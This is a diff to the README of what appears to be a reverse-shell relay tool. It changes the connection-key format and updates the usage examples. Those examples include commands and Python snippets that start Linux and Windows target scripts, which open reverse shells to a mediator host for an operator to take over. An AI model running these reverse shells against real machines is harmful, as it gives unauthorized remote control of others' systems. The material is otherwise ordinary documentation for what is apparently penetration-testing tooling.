@@ -66,7 +66,7 @@ When two handlers or two reverse shells connect to the mediator server with the 
 
 It is important to make sure each handler is using a unique connection key to avoid a race condition resulting in the wrong shell being given to an operator. 
 
-The default connection key is "CHANGE ME!!!".
+Only keys with the prefix "#!ConnectionKey_" will be accepted by the server. The default connection key is "#!ConnectionKey\_CHANGE\_ME!!!".
 
 To change the connection key for *Python script* usage, the connection key can optionally be supplied upon instantiation:
 
@@ -74,7 +74,7 @@ To change the connection key for *Python script* usage, the connection key can o
 ```python
 from handler import Handler
 
-operator = Handler(mediatorHost="example.com", connectionKey="This is my secret key!")
+operator = Handler(mediatorHost="example.com", connectionKey="#!ConnectionKey_secret_key")
 operator.run()
 ```
 
@@ -82,7 +82,7 @@ operator.run()
 ```python
 from linuxTarget import LinuxRShell
 
-shell = LinuxRShell(mediatorHost="example.com", connectionKey="This is my secret key!")
+shell = LinuxRShell(mediatorHost="example.com", connectionKey="#!ConnectionKey_secret_key")
 shell.run()
 ```
 
@@ -90,12 +90,12 @@ If executing a client script *directly from a shell*, you can either hard code t
 
 *handler.py*
 ```bash
-$ python3 handler.py -s example.com -c 'This is my secret key!'
+$ python3 handler.py -s example.com -c '#!ConnectionKey_secret_key'
 ```
 
 *windowsTarget.py*
 ```powershell
-> python windowsTarget.py -s example.com -c 'This is my secret key!'
+> python windowsTarget.py -s example.com -c '#!ConnectionKey_secret_key'
 ```
 
 
